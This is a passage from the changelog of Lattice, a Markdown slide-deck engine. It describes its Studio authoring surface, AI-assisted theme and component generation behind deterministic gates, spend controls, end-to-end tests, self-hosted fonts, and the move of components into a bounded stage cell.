  (the `_class` directive and presenter/reader notes). This is the generation-time complement to the
  preview-frame sanitizer (HARD RULE #22). The frozen held-out set gained a `mustTable` matrix case
  and a state-marker checklist case and runs **16/16** against a real model.

- **Studio — AI component generation widened beyond `inventory` (#610).** The "Describe a component"
  generator now reliably covers **comparison, evidence/statement, and legal** components, not just
  inventory. The frozen held-out adversarial set (`test/fixtures/component-gen-prompts.json`) gained
  prompts for those buckets and stays green against a real model. The widening surfaced one real
  gap — the model reaching for `margin` on a two-column layout — closed by a fourth gate-verified
  worked example in the knowledge file (a two-column comparison built on `grid` + `gap`). No API
  change; the generated components are simply native across more of the transform-free set.

- **Studio — AI component generation: "Describe a component" (#610).** The Component tab now
  has the mirror of the Theme tab's "Describe a look" — describe a component and the model
  proposes a manifest + scoped CSS + skeleton that feels native to Lattice's set, not generic
  CSS. Same architecture as the Theme AI (#613): the model PROPOSES within a tight contract and
  deterministic code DISPOSES. The contract is a concrete **knowledge file** (`lib/layout/ai.js`
  `COMPONENT_CANON`, the analog of `THEME_CANON`) teaching the Form vocabulary (Frame/Cell/Tile,
  the `section.<name> > .cell-stage` root), the full slot table (eyebrow/title/subtitle/pill/
  key-insight/footer/pagination/logo + the three-way rail disambiguation), the token system (the
  `--fs-*` type roles, palette, spacing — never an invented value), every hard invariant with its
  *why* (no margin #20, var(--token) #3, `--fs-*` #4, card-nesting #5, scoping #7, US #21), the
  12-bucket taxonomy, the 10/10 rubric, the `@container lattice` doubled-class reflow recipe, and
  **three fully-worked, gate-verified examples**. **Dedup-first** (§5): before generating, near-
  duplicate components are surfaced (bge-small embeddings → fuse.js lexical fallback) so you reuse
  rather than bloat the catalog — default-on, with a **Workspace toggle**. **Guardrails** (§6/§7):
  the draft runs the same `gateComponent` + `findCssExfil` + design-audit (margin/typography) the
  Studio enforces, plus an **adapt/capacity coherence audit** and a **data:-URI size cap**;
  spatially-neutral fixes (card-nesting, scope-prefix) auto-apply while every spatial violation is
  *flagged, never silently mutated*. **Scope** (§9): transform-free components only — a request for
  a chart, diagram, code, or non-`ul>li` structure is **declined and routed**, never faked.
  Validated against a **frozen held-out adversarial prompt set** (`test/fixtures/component-gen-
  prompts.json` + `tools/component-gen-eval.mjs`): 10/10 cases — gate-clean generation, dedup-route,
  portrait-reflow, the off-contract-color trap, and four decline cases — pass with a real model.
  The aesthetic 10/10 read still rests on human review (the Quality Bar) — there is no automated
  aesthetic gate, by design. The component's **manifest is now first-class**: the AI-proposed
  contract (bucket, function/form/substance, tags, `capacity`, `adapt`) lives in a right-side
  **Manifest panel** on the Component tab with two synced views — a **Fields** form (hover hints
  define each axis) and the raw **manifest.json in CodeMirror** with schema-aware completion (it
  can only suggest a value the gate accepts). The gate validates it live (a bad axis / tag count /
  invalid JSON is a finding), it's **persisted on Save**, and stamped into the export — so a saved
  component stays classifiable (it dedups against future requests and graduates without a re-author)
  instead of being captured then discarded. See
  `engineering/decisions/2026-06-29-ai-component-generation.md`.

- **Studio — one unified Theme + Component designer, with first-class names (#610).** The
  Fabricate Theme and Component tabs now share ONE header and ONE Save/Export UX, so moving
  between them is seamless instead of two private layouts. Naming is unified and made
  first-class: a theme is named by a single author-owned **slug** in the header — exactly
  like a component — retiring the old buried free-text label + hidden `slugify` "magic" the
  author had to reason about (the human display title is just a titleized view of the slug).
  A new **Description** disclosure (collapsed by default, on both tabs) captures a one-line
  caption. When the AI generates a palette it now also **proposes an editable `name` +
  `description`** (`lib/theme/ai.js` → `coerceEssentials`), seeded into those fields and
  **stamped into the export** — the theme CSS header / README and the component manifest
  `description`. Both tabs Export real drop-in files (a theme `<slug>.css`; a component's
  manifest + styles + skeleton) and Save to the shared library. The model proposes; the
  deterministic kernel still disposes (the slug is gate-validated, the palette AA-repaired).

- **Theme Studio — AI delivers a full, AA-verified palette (#610).** The Theme Studio's
  "Describe a look" front door now returns a *finished, accessible* theme: the model
  proposes the 10 author-facing essentials **plus a named categorical-ramp strategy**
  (`spectrum` / `analogous` / `triad` / `complementary` / `brand-mono`), and the
  deterministic kernel (`lib/theme/derive.js`) fans those into the full ~80-token
  contract in OKLCH, **repairing every gate-checked pair to WCAG AA in both canvas
  modes** — so a user never has to tweak a color by hand. The model is fed distilled
  canon (the `themes/README.md` lightness contract + `indaco` as a worked example) so
  its essentials anticipate the derivation. `spectrum` reproduces the prior fixed-spread
  output exactly (no regression); the engine already works in OKLCH internally, so themes
  still serialize as hex + `light-dark()`. The honesty contract ("a failing pair is shown,
  never bypassed") now governs the optional manual-override path. See
  `engineering/decisions/2026-06-29-studio-theme-ai.md`.

- **Studio — layered spend & budget, with real cost control (#610).** A live-key red-team
  found the Spend tab surfaced one weak field of a four-layer budget system — it never
  fetched the account wallet and the gauge ignored the real balance, so "$0.00 used ·
  balance unavailable" read as *free*. The Spend tab now shows four labeled layers —
  **Wallet** (real balance via `/api/v1/credits`), **This key** (the per-key server-enforced
  cap, with a deep-link to set one in the OpenRouter dashboard), **This session** (live
  tally), **Your cap** (client guardrail) — with a gauge that tracks the *binding*
  constraint. New cost control: a **pre-send `≈ $X` estimate** with **hard-stop-on-estimate**
  (a single request can't overshoot the cap), a Studio-scoped **`max_tokens` ceiling** on
  cloud calls (the Drawing Board stays uncapped), and a **cheaper default model** (Claude 3.5
  Haiku, the Studio's first-connect default — model selection itself is shared across
  surfaces) with the active price shown. See
  `engineering/decisions/2026-06-29-studio-spend-budget.md`.

- **Studio — AI model backbone & live spend in the Workspace (G6, #610).** The Workspace
  "AI model" tab gains the curated OpenRouter **model picker** the Studio had been missing —
  the collapsed summary (model name + ctx · price), search, and **Featured / Value / Free / All**
  lenses with vendor-grouped, priced rows (`vision` badge on image models), defaulting to Claude
  Sonnet 4. The dropped **on-device tier** is restored as a **Generation switch** (Cloud / On-device)
  that picks the *active* tier — exposing the full free, private ladder (browser built-in · WebLLM
  ~1GB · universal Transformers.js ~350MB, with confirm-before-download + cancel). A red-team
  hardened this: *connected ≠ active* — a deliberate on-device pick now outranks the connected cloud
  (opt-in `explicitTierWins`, so the Drawing Board's cloud-first order is untouched), the "active"
  badge reflects the true active tier, and one tap resumes the cloud (no disconnect). The vestigial
  **Cloud tab is folded in** (5 tabs → 4). See
  `engineering/decisions/2026-06-29-studio-tier-precedence.md`. The **Spend** tab now shows the *authoritative* OpenRouter account
  balance (`$X left · $Y used` via `openRouterAccount()`) beside the live per-session tally,
  dropping the old local "all-time" figure that always read `$0.00`. The curated lists + pricing/
  grouping helpers are extracted to a shared `or-catalog.js` so the Studio and the Drawing Board
  picker can't drift (HARD RULE #1/#15). Also fixed: the model-status hook no longer blocks the
  whole panel on the account network call — the tier/picker render immediately, the balance folds
  in when it arrives.
- **Studio E2E coverage with Playwright (`docs/e2e/`, #595).** A real-browser
  end-to-end suite drives the Studio (`/studio/`) across desktop / tablet / mobile
  — engine paint, slide ops, editor lint + Fix-all, the Deck inspector
  (front-matter, speaker notes, version history), palette/theme, the ⌘K command
  palette, insert-component, Present, Workspace, the Architect (honest offline),
  Fabricate + the Layout gate, and reload persistence — each asserted on a real
  cause-effect oracle. Consolidates the playground paint check onto Playwright.
  Runs nightly (`studio-e2e-nightly.yml`) with trace + video on for a watchable
  record. See `engineering/decisions/2026-06-28-experience-gating-playwright.md`.
- **HARD RULE #3 now gated over shipped CSS — `checkHexLiterals` (#588).** The no-hex-literal rule
  (always `var(--token)` so colour follows the palette + keeps WCAG AA) was enforced only on the
  Layout-Studio authoring path; it now runs over the engine's layout CSS (`lib/**`, minus
  `*.tokens.css`) via `build:check`, reusing `lib/layout/gate.js`'s `findHexLiterals`. Budget 0 +
  a small `SANCTIONED_HEX` allowlist for the genuinely fixed colours (the overflow-warning red, the
  always-white status-stamp ink), with `var(--token, #fallback)` defaults exempt. Shipped CSS was
  already clean, so it lands green and ratchets — a stray hex now fails the build instead of shipping.
- **Studio — a unified authoring surface on the docs site (`/studio/`).** A
  React-island redesign that folds composing, theming, presenting, and sharing
  into one workspace, wired to the real engine — not placeholders:
  - **Fabricate** derives a complete, contrast-repaired theme from four picked
    core colours via the shared theme engine (`deriveTheme`/`auditBoth`/
    `serializeTheme`), with a live WCAG audit that can fail and a specimen
    rendered in the derived theme; Export downloads a real `themes/*.css`.
  - **Present read-aloud** is a real synchronized teleprompter (each sentence
    highlighted as read), with spoken audio over the production voice ladder
    (connected OpenRouter voice → in-browser Kokoro → captions-only floor).
  - **Share** runs the real export pipeline — Markdown (theme embedded), the
    Marp ZIP bundle, one-click image PDF/PPTX, and vector Print — reusing the
    Drawing Board's exporters.
  - **Rehearse** (in Present) runs the deterministic rehearsal planner: real
    per-slide dwell targets, an on-pace/behind indicator against the cumulative
    budget, and role-specific delivery coaching with timed beats.
  - **Persistence** — your edits survive switching decks and a full reload;
    new / rename / delete decks and the Inspector/Workspace settings persist
    (Studio-scoped `lattice-studio-*` localStorage).
  - **Inspector controls** write real deck front-matter: Size picks a `size:`
    directive (reflected live in the preview), Page numbers writes `paginate`,
    and Running header writes `header` — each carried into every export.
  - **Architect (AI)** is wired honestly to the production model ladder: with a
    model connected, Rewrite lead / Reshape run a real completion and apply the
    parsed edit blocks; with none, they degrade honestly (point at Workspace)
    instead of faking a change. Workspace shows the real active tier, one-click
    OpenRouter OAuth connect/disconnect, and real session/all-time spend. Fix-all
    now lands the linter's per-name suggestion, not a hardcoded `kpi`.
  - **Compose editing depth** — a slide toolbar (add / duplicate / reorder /
    delete), a searchable **insert-component palette** over all 53 shipped
    components (inserts each one's authored skeleton), context-aware editor
    **autocomplete** (component names, front-matter keys, fenced-block
    languages), and the full **grammar linter** (the shared lint-core: severity
    tiers, hover fix guidance, and one-click per-finding quick-fixes).
  - **Library depth** — **import a deck** from a `.md` file (title derived from
    its first heading), and **version history**: an Inspector timeline of saved
    checkpoints with one-click Restore, captured manually and automatically
    before each AI edit (so an AI change is reversible beyond undo).
  - **Architect chat** — a real conversational thread (Coach/Chat toggle,
    per-deck history) that runs through the connected model with the deck in
    context and returns proposed edits as a reviewable **Apply/Discard diff
    card**; plus an editable **session budget cap** the architect honours.
  - **Speaker notes + Fabricate starters** — a per-slide speaker-notes field
    (written as a real LFM note, exported to PDF/PPTX and read aloud in Present),
    and curated **starter palettes** (Dusk/Ember/Pine/Slate) in Fabricate that
    reseed and re-derive the whole theme.
  - **Fabricate Theme Studio depth** — pick **all ten essentials** (the engine's
    full `ESSENTIAL_KEYS`, grouped surfaces / ink / brand / signals), audition the
    derived theme in **light or dark** (a per-render mode override resolves its
    `light-dark()` pairs without flipping the page), name it, and **Save to
    library** — persisted to the **shared Workbench asset store** (the same
    library the Workbench Theme Studio uses) so a saved theme becomes selectable
    from the Inspector's Look group and the topbar theme menu, and renders your
    deck live (and through every Share export) — not just the specimen.
  - **Present — dual-screen presenter window.** The "Presenter screen" button now
    opens a real second-window speaker view (current + next slide, your speaker
    notes, an elapsed timer with reset, prev/next), kept in sync over
    `postMessage` and auto-placed on a second screen when the browser grants it.
    It is the **same** reveal-style presenter the Drawing Board ships — both now
    drive a shared kernel (`presenter-window.js`), one source of truth.
  - **Fabricate — real Component/Layout Studio.** The Layout tab (a density radio)
    is now a working local-component authoring surface: name a `.<name>`-scoped
    component, write its CSS + a skeleton, and watch the **real deterministic gate**
    flag every violation live (a hex literal → "use a palette token"; an unscoped
    selector → "would leak onto other slides"; a skeleton that doesn't invoke the
    class), with the component **rendered live** in the preview. Save a clean one to
    the **shared Workbench library** (the same `componentAsset` store the Workbench
    Layout Studio uses). Reuses `layout-core.generated.js` — no engine fork.
  - **Insert + render your saved local components.** A component authored in the
    Layout Studio now appears in the **Insert palette** under a `local` group
    (ahead of the built-in buckets); inserting it drops its skeleton as a new
    slide. Wherever the deck uses a `.<name>` you saved, its CSS is injected so the
    slide renders **styled** — in the live compose preview, the second-screen
    presenter, and every Share export (PDF/PPTX/Print). Validation and editor
    autocomplete recognize your local names too, so a component you authored never
    reads as "unknown."
  - **Architect — refine a selection.** Select prose in the editor and a **Refine**
    control appears: **Polish / Formalize / Elaborate / Shorten**, each a real model
    rewrite of *just the selection*, applied as one undoable transaction (a pre-edit
    checkpoint makes it reversible from History too). Reuses the Drawing Board's pure
    refine kernel (`buildRefinePrompt`/`cleanRewrite`) — the brief forbids inventing
    facts or breaking markdown. Honest with no model (the menu offers a connect path,
    never a fabricated edit) and respects the session budget cap.
  - **Architect — per-finding AI fix.** The Coach panel now surfaces the deck's
    deterministic lint findings (the same per-slide notes the editor underlines) as
    an actionable list; with a model connected each grows a **Fix with AI** button
    that asks the model to rewrite just the flagged slide and returns a reviewable
    **Apply / Discard diff card** (a pre-edit checkpoint makes it reversible). Reuses
    the Drawing Board's `requestSlideFix` (the edit-block protocol + canon grounding)
    and the chat's `DiffCard`. Honest with no model (the list still shows; the fix
    points at Workspace) and respects the budget cap.
  - **Present — slide sorter.** A **Slides** button (and the **G** key) opens a grid
    of rendered slide thumbnails over the presented set — the same engine render as
    the stage, not screenshots — for jumping anywhere (handy in Q&A). Thumbnails are
    **windowed**: each defers its render until it scrolls into view, so a long deck
    stays light. Click a thumbnail to jump there and close the grid; the current
    slide is marked. Honors the active lens, theme, and saved local components.
  - **Present — read-aloud autoplay.** An **Auto** toggle in read-aloud mode plays
    the deck hands-free: it reads each slide's narration, then advances on the
    natural finish and reads the next, to the end. Works with **no voice connected**
    too — the caption teleprompter's own cadence drives the chain (a slide with no
    prose is skipped, not stalled). Built on a new `onFinish` signal on
    `useReadAloud` that fires only on a natural end (not a manual stop or slide nav);
    mutually exclusive with Rehearse.
  - **Chrome & toolbar polish (mobile).** The two panel toggles now carry distinct,
    meaningful icons (Architect vs Deck inspector) instead of two identical panel
    glyphs; the top-bar and editor-header buttons (Present / Share / Insert / Fix all)
    collapse to **icon-only** below desktop so a phone row doesn't crowd; the user
    avatar holds a fixed **circle** (no more squish); the slide-rail reorder arrows
    use unambiguous move-to-position icons (they reorder, they don't navigate); and
    **deleting a slide now confirms** — the first tap arms the button, a second
    within 3s deletes (it disarms on its own and on slide change).
  - **Preview & notes polish (mobile).** The compose preview card now takes the
    **aspect ratio of the deck's selected Size** (16:9 / 4:3 / 1:1 / 4:5 / 9:16) —
    portrait shapes bind to height so they fit the pane — instead of a hardcoded
    16:9; the Size picker gains Portrait and Story, and the status readout shows the
    real ratio. **Swipe** (touch) and a horizontal **trackpad wheel** now change the
    viewed slide. And **speaker notes** moved out of the Deck Inspector into their
    own drawer, opened from a Notes button in the editor row (and the mobile
    Edit/Preview bar).
  - **Theme selection & light/dark.** Every shipped palette is now selectable from
    a **grouped** theme picker (topbar + Inspector) — **Curated**, your **saved**
    Fabricate themes, the **AA color-blind-safe** set (`a11y-*`, the contrast-verified
    CVD palettes that were missing), then the rest — each with a swatch. A new
    **light/dark toggle** (topbar + the Look group) flips the deck's mode so the
    preview, Present, and exports all audition in the chosen mode. Reuses the
    site-chrome mode store and the shared `paletteLabel`.
  - **Theme Studio depth — editable light/dark contract.** The engine-derived
    contract is no longer a row of unlabeled swatches: it's a **labeled table**
    of the roles a theme author curates (Background, Surface, Border, the ink
    trio, Accent + wash, the signals), each with an **editable Light and Dark
    well**. Clicking a well **pins an override** on top of the derivation, the
    WCAG audit re-checks it live, and a reset restores the engine value — which
    finally makes light-vs-dark curation explicit (you pick light; the engine
    derives an AA-safe dark; override either side). Naming is now consistent with
    the Component studio — **no magic default**; you name the theme (Save is
    disabled until you do), and Export/Save sit as icon buttons on the studio
    header row.
  - **Theme Studio depth — editable data-viz band on a live canvas.** The Theme
    studio now surfaces the engine's full **chart + diagram band** (the categorical
    colours charts and Mermaid cycle through): the 8 chart series, the 12
    categorical fill/mark pairs, and the diagram / chart-state tokens. They're
    edited on a **live canvas** — a slide, a pie chart and a Mermaid flow render
    side by side and re-render on every edit, with a docked tray to select a band
    token (light/dark wells for mode-varying tokens, one well for mode-independent
    ones) and a per-token reset. Overrides re-run the WCAG audit, same as the
    contract. Responsive: 3-up on desktop, stacked on tablet/mobile.
  - **Studio renders Mermaid from a local copy, not a CDN.** `single-slide-render`
    gained an optional `mermaidUrl`; the Studio points it (and the dual-screen
    presenter) at the committed `mermaid-v11.min.js` the Export-to-Marp bundle
    already ships — so Studio diagrams render offline and under a strict CSP,
    never depending on jsdelivr. Other surfaces keep the CDN default unchanged.
  - **Component Studio** (renamed from "Layout Studio" everywhere user-facing —
    tab, headers, launcher, command palette). Its **CSS + skeleton inputs are now
    CodeMirror** editors (shared `CodeField`): syntax highlighting via a
    palette-cohesive `HighlightStyle` (every colour a token, so it tracks light +
    dark), line numbers, and undo — sharing the deck editor's theme (`editor-theme`,
    extracted to reuse). Degrades to an accessible `<textarea>` where CodeMirror
    can't lay out (jsdom). The live palette-blind + scoped gate is unchanged.
  - **Library — one shelf for every saved theme + component**, opened from the
    topbar. Browse/search/filter, **Apply** a theme or **Insert** a component,
    **delete**, and a unified **Share** that downloads a `.zip` on the new
    lattice-asset contract: a theme zip carries `manifest.json` + `<slug>.css` +
    a **live-rendered `showcase.pdf`** (title · KPIs · journey chart · Mermaid ·
    split-panel · closer, in the theme) + README; a component zip carries its CSS
    + skeleton; multi-select packs a `lattice-assets.zip` bundle. **Import** a
    `.zip` re-hydrates straight into the Library. See
    `engineering/decisions/2026-06-29-lattice-asset-share.md`.
  - **Share→PDF renders Mermaid from the local copy** (the Studio's `mermaidUrl`
    now threads through the export capture), so exported decks' diagrams no longer
    depend on the jsdelivr CDN. `renderPdfBlob` extracts the PDF-to-bytes core of
    `exportPdf` for embedding (the Library's showcase).
  - **Performance — typing no longer re-renders the engine on every keystroke,
    and exports show live progress instead of freezing.** The live preview now
    coalesces rapid edits to one trailing render (the editor stays at 60 fps;
    production main-thread blocking per typing burst drops from ~53 ms to ~0 ms,
    and the worst-case spikes are gone), and a leaked per-keystroke render in the
    preview's active-edge effect is closed. The PDF/PPTX export now reports
    per-slide progress ("Rendering slide 3 of 6…") and yields between slides so
    the tab paints and stays responsive through a multi-second render — the
    exported bytes are unchanged. Profiling showed the two paths once slated for
    web workers (theme derivation, lint) are sub-millisecond, so no worker was
    added. See `engineering/decisions/2026-06-29-studio-render-debounce.md`.
- **`--present`: PDFs that open straight into full-screen presentation mode.**
  A new opt-in CLI flag marks the exported PDF's document catalog so Adobe
  Acrobat/Reader and most desktop viewers open it directly in full-screen /
  presentation view (`/PageMode /FullScreen`, single-page layout, a clean
  page-only fallback when the presenter exits), with a subtle cross-fade between
  slides (`/Trans /Fade`). Slides stay presenter-driven — no kiosk auto-advance.
  Browser-embedded viewers (Chrome's pdfium, Firefox's pdf.js) and macOS Preview
  ignore the hints harmlessly, so it's a no-cost enhancement everywhere else.
  Enable it on the command line (`--present`) or bake it into a deck with a
  `present: true` front-matter key (mirroring `--fluid`). Default off; the
  catalog is untouched without it.
- **`logo-wall` marks can carry an optional name and pill below them.** Nest a list
  under a mark — plain text becomes a centred name, a backticked token becomes a pill
  chip — so a stylised logo can be disambiguated or qualified (a funding tier, a segment,
  a year) without leaving the wall. Both are optional and per-mark, so a mixed wall works.
  The caption stacks *below* the mark and centres (the cell is now a column, not a row);
  the name + pill re-tone for the `dark` canvas automatically. Pure structure + CSS — no
  transform. Also **redrew the twelve placeholder brand marks** into distinct silhouettes
  and wordmarks (so the wall reads as a credible roster even desaturated to grey), and
  **fixed the broken marks in the Playground component studio** (the manifest sample
  referenced the SVGs by bare filename but only the bucket-gallery copies were staged —
  the marks are now staged flat under `samples/` too). See
  `lib/components/inventory/logo-wall/logo-wall.docs.md`.
- **Live, in-editor validation in the Drawing Board and Playground.** The deck-grammar
  findings the Architect already computes (layout/component footguns, capacity, unknown
  classes/regions, …) now also render *inline* in the CodeMirror editor as wavy
  underlines with a hover tooltip (message + fix) and a one-click quick-fix for the
  mechanical cases — the same deterministic `lib/authoring/lint-core.js` the Node CLI
  and the panel run, surfaced where the cursor is. Severity colours come from shared
  brand tokens (`--db-sev-error` / `--db-sev-warning`, token-first off `--fail`/`--warn`)
  so the underlines, the hover, and the panel read as one palette-blind system. Adds a
  severity gutter, keyboard navigation (F8 / Shift-F8 between findings, Ctrl-Shift-M for
  the lint panel), and a **Fix all** action (the Architect panel button and the editor's
  Alt-Shift-F) that applies every mechanical fix at once. Governed per deck by a new
  `validate:` front-matter key (default **on**; `validate: off` opts a deck out), toggled
  from the deck-setup drawer — so the choice travels with the deck and its exported `.md`.
- **More autofixable lint rules.** `lib/authoring/lint-core.js` gains machine fixes for
  `ledger-inline-title` (→ the numbered `1. Name` / `   - body` shape) and
  `gantt-retired-delimiter` (the retired `→`/`–`/`->` span delimiter → `..`), plus
  `applyAllFixes(source, vocab)` for batch application — shared by the editor, the
  Architect panel, and the CLI. `applyFix` now preserves the fixed line's indentation.
- **`inventory` is now a real component — one content shape, four looks (the 53rd component).**
  **Breaking:** the contract-tier classes `layout-ledger` / `layout-cards` / `layout-timeline` /
  `layout-editorial` are retired; author `<!-- _class: inventory -->` (the default numbered
  ledger) and the variants `inventory cards` / `inventory timeline` / `inventory editorial`
  instead. The four looks always rendered the byte-identical inventory DOM (eyebrow · title ·
  bold-lead items · insight); they were a separate "contract" tier that no count or doc surfaced
  and that broke under Form. Promoting them to a first-class component with a default + three
  variants means they now appear in the manifest, the component reference + machine catalog
  (`dist/docs/components.json`), the playground autocomplete, and the count (**52 → 53
  components**) — like every other component. The standalone contract machinery
  (`lib/contracts/`, `layoutClasses()`, the contract drift-test union, the `CONTRACT_LAYOUT_SOURCES`
  CSS bundle hook) is retired with it; `engine: inventory` registers as `STAGE_MIGRATED` so the
  looks render bounded under Form. The demo deck moves `examples/contract-inventory.md` →
  `examples/inventory.md`. Verified all four looks render light + dark.
- **The library self-hosts its fonts — zero network dependency.** The engine no
  longer reaches for a CDN at render time: the Google-Fonts `@import` is replaced
  by a self-hosted `@font-face` block built from a canonical manifest
  (`lib/fonts/text-faces.js`), with the 17 text faces **and** KaTeX's 20 math faces
  vendored into `dist/fonts/` (shipped, ~1 MB) and referenced by stylesheet-relative
  `url('fonts/…')`. Every render path — browser, marp-cli, runtime, and the emulator
  PDF — now loads type from the library's own bytes. Colour emoji falls back to the
  installed system emoji font by default; an opt-in full-offline tier
  (`npm run fonts:emoji` + the committed `dist/lattice-emoji.css`) vendors the ~25 MB
  Noto Color Emoji for air-gapped environments (excluded from the npm tarball). A new
  CDN regression guard in the `fonts:check` gate fails the build if any Google-Fonts
  URL reappears. See `engineering/decisions/2026-06-26-local-font-library.md`.

- **`compare-prose` and `code` adopt the stage cell — completing the standard-component
  cell-tree migration.** Both migrate into the frame's bounded `.cell-stage` (the section
  gains a flex-column stage so `compare-prose`'s two cards and `code`'s fenced block fill
  it); `compare-prose`'s `vertical` variant now splits the stage evenly instead of
  stranding its pair at the top. **`compare-prose`'s `❯` connector is rebuilt flex-native:**
  it was an absolute chevron floated at 50/50 with a `var(--bg)` chip masking the gap —
  now it's a real flex item bracketed between the cards by `order` (card · connector ·
  card), a dedicated divider slot with no overlay and no mask. The `decision` variant's
  DECISION tag loses its background and the connector slot is widened so the label sits in
  the divide, clear of the cards. Closes the per-component migration
  (`2026-06-26-frames-as-flex-cell-trees.md` §6) for the standard set.

- **`authority-chain`, `statute-stack`, `verdict-grid` adopt the stage cell — and fill it.**
  Three more legal/comparison components migrate into the frame's bounded `.cell-stage`:
  the `verdict-grid` 2×2 fills the stage with `minmax(0,1fr)` rows on a flex-column cell;
  the `authority-chain` tiers distribute with `flex:1; min-height:0` (its `pyramid` shape
  variant stays content-height + centred so the silhouette reads); `statute-stack`'s rails,
  hierarchy, and bands fill the stage. Continues the per-component cell-tree migration
  (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **The fill-family components adopt the stage cell — and fill it.** `kpi` (all five
  variants — briefing, ops, compliance, trajectory, spotlight), `cards-stack`, `actors`,
  and `checklist` migrate their bodies into the frame's bounded `.cell-stage` cell and are
  tuned to *use* it: metric grids size with `minmax(0,1fr)` rows so they distribute into
  the stage instead of overrunning it; card/roster/check lists take `flex:1; min-height:0`
  so rows share the stage height rather than stranding the last item past the clip;
  `checklist` rows centre their content and state-disc on the row midline. kpi sheds an
  obsolete `.cell-stage` `padding-top` (header-clearance carryover — the masthead band now
  owns that), recovering the height its densest layout needs. Continues the per-component
  cell-tree migration (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **`citation-card` adopts the stage cell — and every variant now fills it.** The legal
  citation component migrates to the `.cell-stage` body cell (bounded by the frame), and
  each variant is tuned to *use* the bounded stage rather than strand content at the top:
  the **split** centres the verbatim quote in its filled accent panel with the gloss
  centred to match; the **margin** hero quote is sized to fit (`--fs-h2`) and framed by
  its accent rules; the **default / pull-quote / dark / compact / accent** document
  variants centre their quote → plain-English → obligation block in the stage (a stray
  `flex:1` on the list had been absorbing the height and stranding the content). Continues
  the per-component cell-tree migration (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **Three more components adopt the frame's stage cell.** `list-steps`, `list-criteria`,
  and `obligation-matrix` migrate to the `.cell-stage` body cell, so their bodies are
  bounded by the frame and clip at the stage edge instead of bleeding toward the footer.
  Each needed its own flex context: the `list-steps` strip / `list-criteria` per-item
  list are `flex:1`, so their stage becomes a flex column; the `list-steps timeline`
  variant's spine and centring re-home onto the cell; `obligation-matrix` (a `<table>`)
  moves its column layout onto the stage. The `timeline` title now frame-conforms into
  the masthead band like every migrated frame. Continues the per-component cell-tree
  migration (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **The footer is a real `.cell-footer` cell, and the page number is a real element.**
  A migrated frame's running `footer:` text, section progress rail, and page number now
  live in one `.cell-footer` band — the frame's third cell — instead of three separately
  positioned overlays. The band **mirrors the running `<header>`**: it sits in the same
  edge berth (`left`/`right: var(--frame-inset-x)`) at the inset that mirrors the header's
  top (`bottom: var(--frame-inset-y)`), so the header's top/left padding equals the footer's
  bottom/left padding **exactly** — symmetric by construction. The three marks (footer text ·
  rail · page number) are **vertically centred** with each other. By default the band **hugs
  the bottom edge**; the new **`footer-inset`** universal modifier lifts it into the frame
  so the bottom inset mirrors the top by a full band height. The page number is **de-pseudo'd**
  — it was a `section::after` pseudo-element painted over the slide; it is now a real
  `<span class="lat-pagination">` (a page number is content, not decoration). The decorative
  numbered-divider numeral stays a pseudo. Frames not yet migrated keep the positioned footer
  + pseudo, so nothing regresses. Completes the footer row of the flex cell-tree
  (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **The centering statement/evidence components adopt the stage cell.** `quote`, `stats`,
  `big-number`, `decision`, and `q-and-a` migrate to `.cell-stage`. These components
  centre their content; the centring is re-established on the cell (a moved
  `justify-content`/`align-items` block now also carries `display:flex` so it composes —
  Marpit's section was implicitly flex, the cell must be too), so a pull-quote / hero
  number sits centred in the stage with the masthead pinned top (frame-conform).
  Continues the per-component cell-tree migration (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **Five more components adopt the frame's stage cell.** `agenda`, `logo-wall`,
  `regulatory-update`, `compare-table`, and `list-tabular` migrate to the `.cell-stage`
  body cell, so their bodies are bounded by the frame. The centering components (`agenda`)
  now pin their masthead to the top like every other Form frame and distribute the body in
  the stage — the same frame-conform shift `content` adopted; body content is unchanged.
  Continues the per-component cell-tree migration (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **More components adopt the frame's stage cell.** `list`, `glossary`, `matrix-2x2`, and
  `pricing` migrate to the `.cell-stage` body cell (all pixel-identical), so their bodies
  are bounded by the frame and can't bleed past the stage edge. The universal pill chrome
  (`base.modifiers.css`) is made stage-aware so an actor-name / criterion chip keeps its
  outlined-pill styling once its component's body moves into the cell. Continues the
  per-component cell-tree migration (`2026-06-26-frames-as-flex-cell-trees.md` §6).

- **The frame's body is now a real bounded cell — prose can't bleed into the footer.**
  The Form frame gains its third cell: a `<div class="cell-stage">` the masthead kernel
  builds around the body (alongside the existing `.cell-masthead` band). `section.form`
  becomes a flex column (masthead / stage / footer-reserve) and the stage cell is
  `flex:1; min-height:0; overflow:clip` — so an over-stuffed generic-prose body is walled
  at the stage edge instead of painting through the footer / rail / pagination band (the
  long-standing bleed). This revives the `.cell-stage` wrapper that section-as-*grid*
  retired in 2026-06-16: flex auto-rows are content-height by construction, so the
  objection that retired the grid version (a fixed row fights the content-height masthead)
  doesn't apply (`engineering/decisions/2026-06-26-frames-as-flex-cell-trees.md` §7). The
  migration is per-layout and fail-safe: generic prose (`content` / bare `form`) and
  `cards-grid` carry the cell today; every other component keeps its direct-child body
  untouched until it is individually migrated and visually verified (tracked by
  `STAGE_MIGRATED` in the masthead kernel), so nothing is silently broken.
- **Universal alignment modifiers for Form slides** — `align-top` (default), `align-middle`,
  `align-bottom` (vertical) and `align-left` (default), `align-center`, `align-right`
  (horizontal) govern how the stage cell distributes its content. `fill-center` / `fill-anchor`
  are retained as legacy aliases of `align-middle` / `align-bottom` (#527).

- **Debug bounding boxes in the Playground preview.** A toolbar toggle next to
  Deck setup outlines every element in the live preview with colour-coded,
  outline-only boxes (zero layout impact — they can't reflow a slide) for
  eyeballing layout, nesting, and spacing while you edit. The button is a
  temporary, session-only flip; a matching switch in the deck-setup drawer
  (Preview · debug) persists the default per device. It's a viewer preference —
  never written to the deck's front matter, never exported.

- **The deck-setup drawer gains an "Auto-split overflow" toggle.** Enabling the Fit
  Ladder's SPLIT move (`autosplit: on`) is now a first-class switch in the deck-config
  drawer — on the Drawing Board and the Playground — alongside Islands and the other
  deck-wide settings, so authors no longer hand-write the front matter. It writes the
  canonical `autosplit: on` and clears the key when off; the hint names the gate
  (portrait & square sizes only — a landscape deck is a no-op, which `lint:deck` already
  warns about) and notes that auto-split is a build-time pass, applied **on export** and
  not reflected in the live preview (unlike islands, a live CSS class). The editor
  autocomplete completes `autosplit:` values too. Mirrors the islands plumbing
